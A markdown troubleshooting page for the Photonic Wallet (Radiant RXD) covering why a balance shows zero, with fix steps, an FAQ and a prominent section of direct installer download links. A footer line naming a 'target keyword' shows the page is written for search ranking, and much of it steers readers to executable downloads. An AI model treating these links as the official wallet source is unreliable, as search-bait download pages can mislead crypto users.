<div align="center">

<img src="../assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.webp" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Photonic Wallet balance shows zero

[![Website](https://img.shields.io/badge/Website-photonicwallet.org-7c3aed?style=for-the-badge)](https://photonicwallet.org) [![Release](https://img.shields.io/badge/Release-v3.0.4-00b4d8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://img.shields.io/badge/Docs-guides-0a0e1a?style=for-the-badge&logo=readthedocs&logoColor=white)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** A zero balance usually means the wallet is still syncing or connected to a slow server; your coins remain on-chain.

---

## You'll see this if

- Balance shows 0 RXD
- History is empty
- Recent deposit missing

## Why it happens

The wallet reads balances from a server. Until it answers, nothing appears. More background lives in our guide on [photonic wallet not syncing](photonic-wallet-not-syncing.md) and on the [troubleshooting guide](https://photonicwallet.org/guides/troubleshooting).

## Fix it step by step

1. Wait for sync to finish.
2. Check your address on an explorer.
3. Switch server in settings.
4. Update to v3.0.4 and reopen.

## If that didn't work

If the explorer also shows zero, the payment went to another address; check the sender's details. The [check a transaction](https://photonicwallet.org/guides/check-rxd-transaction) covers related cases, and [Change the ElectrumX server in Photonic](change-electrumx-server-photonic.md) may match your situation.

## Prevention

Keep the wallet updated and let it sync before sending.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Did I get hacked?</b></summary>

Check the explorer first; a sync delay is far more common.

</details>

<details>
<summary><b>How long is sync?</b></summary>

Usually minutes, depending on server load.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Photonic Wallet not syncing](photonic-wallet-not-syncing.md) | Photonic Wallet guide |
| [Change the ElectrumX server in Photonic](change-electrumx-server-photonic.md) | Photonic Wallet guide |
| [RXD transaction stuck unconfirmed](rxd-transaction-unconfirmed.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: photonic wallet balance zero · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
